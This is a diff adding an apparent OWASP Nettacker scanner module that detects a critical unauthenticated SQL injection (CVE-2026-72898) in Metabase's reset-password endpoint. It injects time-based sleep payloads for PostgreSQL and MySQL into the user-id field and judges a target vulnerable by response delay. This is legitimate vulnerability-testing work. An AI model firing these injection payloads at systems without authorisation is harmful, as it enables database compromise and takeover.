@@ -1,0 +1,67 @@
+info:
+  name: metabase_cve_2026_72898_vuln
+  author: OWASP Nettacker Team
+  severity: 10
+  description: >
+    CVE-2026-72898 is a critical SQL injection vulnerability (CVSS 10.0) affecting multiple self-hosted versions of Metabase.
+    The flaw resides in the POST /api/session/reset_password endpoint, where an unauthenticated remote attacker can inject 
+    arbitrary SQL payloads, allowing direct read/write access to the underlying application database (PostgreSQL, MySQL, or MariaDB). 
+    Successful exploitation can lead to full administrative control over the Metabase instance.
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2026-72898
+    - https://www.resecurity.com/fr/blog/article/metabase-zero-day-exploited-in-the-wild-unauthenticated-sql-injection-leading-to-full-admin-access
+  profiles:
+    - vuln
+    - http
+    - critical_severity
+    - cve
+    - cve2026
+    - sqli
+    - metabase
+    - cisa_kev
+
+payloads:
+  - library: http
+    steps:
+      - method: post
+        timeout: 15
+        headers:
+          User-Agent: "{user_agent}"
+          Content-Type: "application/json"
+        ssl: false
+        allow_redirects: false
+        json:
+          token: placeholder
+          password: ab640cb2-83ce-40e4-a5c9-9f15da614053 # avoid hitting too-common password error
+          user-id:
+            raw:
+              nettacker_fuzzer:
+                input_format: "12345678) {{sqli}}"
+                prefix: ""
+                suffix: ""
+                interceptors:
+                data:
+                  sqli:
+                    - "OR (SELECT pg_sleep(6)) IS NULL --" # postgresql
+                    - "OR (SELECT sleep(6)) #" # mysql, mariadb
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/api/session/reset_password"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 3000 # default metabase port
+                - 80
+                - 443
+        response:
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "400"
+              reverse: false
+            responsetime: ">= 6"
